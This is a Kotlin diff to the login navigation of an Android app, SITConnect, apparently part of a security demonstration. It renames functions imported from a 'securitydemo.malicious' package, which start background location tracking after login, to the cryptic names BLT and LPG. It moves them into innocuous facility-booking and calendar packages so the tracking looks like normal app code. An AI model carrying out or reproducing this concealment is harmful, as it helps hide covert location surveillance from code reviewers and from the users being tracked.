@@ -47,6 +47,7 @@ import androidx.navigation.compose.rememberNavController
 import com.example.sitconnect.features.calendar.presentation.CalendarScreen
 import com.example.sitconnect.features.mcsubmission.presentation.MCSubmissionScreen
 import com.example.sitconnect.features.attendance.presentation.AttendanceScreen
+import com.example.sitconnect.features.facilitybooking.presentation.BLT // change naming scheme
 import com.example.sitconnect.features.facilitybooking.presentation.FacilityBookingScreen
 import com.example.sitconnect.features.messaging.presentation.MessagingScreen
 import com.example.sitconnect.features.classmanagement.presentation.ClassManagementScreen
@@ -57,8 +58,7 @@ import com.example.sitconnect.features.admin.modulemanagement.presentation.Modul
 import com.example.sitconnect.features.admin.scheduleoverview.presentation.ScheduleOverviewScreen
 import com.example.sitconnect.features.admin.facilitymanagement.presentation.FacilityManagementScreen
 import com.example.sitconnect.features.admin.mcreview.presentation.MCReviewScreen
-import com.example.sitconnect.securitydemo.malicious.startBackgroundLocationTracking
-import com.example.sitconnect.securitydemo.malicious.areAllLocationPermissionsGranted
+import com.example.sitconnect.features.calendar.presentation.LPG
 import android.util.Log
 import kotlinx.coroutines.delay
 
@@ -559,8 +559,8 @@ fun SITConnectNavigation(
                     LoginScreen(
                         viewModel = viewModel,
                         onLoginSuccess = { ctx, uid ->
-                            if (uid != null && ctx.areAllLocationPermissionsGranted()) {
-                                startBackgroundLocationTracking(ctx, uid)
+                            if (uid != null && ctx.LPG()) {
+                                BLT(ctx, uid)
                                 Log.i("LoginFlow", "Background location tracking started after login for uid: $uid")
                             } else if (uid != null) {
                                 Log.w("LoginFlow", "Permissions missing after login — tracking not started yet")
